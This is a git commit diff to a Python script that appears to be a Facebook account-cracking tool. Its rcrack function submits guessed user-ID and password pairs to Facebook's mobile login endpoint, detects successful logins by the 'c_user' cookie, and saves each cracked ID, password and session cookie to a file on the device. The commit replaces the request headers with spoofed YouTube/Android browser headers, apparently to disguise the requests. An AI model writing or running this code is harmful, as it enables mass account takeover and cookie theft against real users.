29dc879cb1725744bdcc817ea494b54ca6e0f174
Free Tool By Arafat <144511390+arafat96698@users.noreply.github.com>
2023-10-09 13:55:57 +0600

    Update new1.py

--- new1.py
+++ new1.py
@@ -198,27 +198,29 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb ={
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'authority': 'www.youtube.com',
+    'accept': '*/*',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'dpr': '2.625',
-    'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=Aff6IWoeAj-_kBEZD7h9UdK-vL4x1YNPAOUx_lYUaB7VC0_sGaEurN6q1UMDco0ZF60hkkcHbII7co7hS4wZ1Q2NFgrVU-vO8ti6E3SxU4Bb1A&smuh=30437&lh=Ac8FcL7QJddHzwm-32o&_rdr',
-    'sec-ch-prefers-color-scheme': 'dark',
+    'content-type': 'application/json',
+    'origin': 'https://www.youtube.com',
+    'referer': 'https://www.youtube.com/embed/?enablejsapi=1&rel=0&autoplay=0&playsinline=1&expflag=embeds_enable_muted_autoplay%3Atrue&fs=1',
     'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-    'viewport-width': '980',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'x-client-data': 'CNWGywE=',
+    'x-goog-request-time': '1696837830521',
+    'x-goog-visitor-id': 'CgstZlc0cWk2dEhPcyjB4Y6pBjIICgJCRBICGgA%3D',
+    'x-youtube-ad-signals': 'dt=1696837826131&flash=0&frm=2&u_tz=360&u_his=5&u_h=915&u_w=412&u_ah=915&u_aw=412&u_cd=24&bc=31&bih=-12245933&biw=-12245933&brdim=0%2C0%2C0%2C0%2C412%2C0%2C412%2C777%2C0%2C0&vis=2&wgl=true&ca_type=image',
+    'x-youtube-client-name': '56',
+    'x-youtube-client-version': '1.20231003.01.00',
+    'x-youtube-time-zone': 'Asia/Dhaka',
+    'x-youtube-utc-offset': '360',
 }
+
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -228,7 +230,7 @@ def rcrack(uid,pwx,tl):
                 os.system('espeak -a 300 "CONGESTION YOU HAVE A OK IDS"') 
                 cek_apk(session,coki)
                 # print('\r\r\33[1;30m[unsuccessful_CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/successful_ok.txt', 'a').write(ids+'|'+pas+'|'+coki)
+                open('/sdcard/brand_ok.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -241,8 +243,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}successful{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
-        sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [search] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m \033[1;32mOK\033[1;37m/\033[1;31mCP \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]•\033[1;37m[\033[1;31m%s\033[1;37m]'%(loop,len(oks),len(cps)));sys.stdout.flush()
     except:
         pass
  
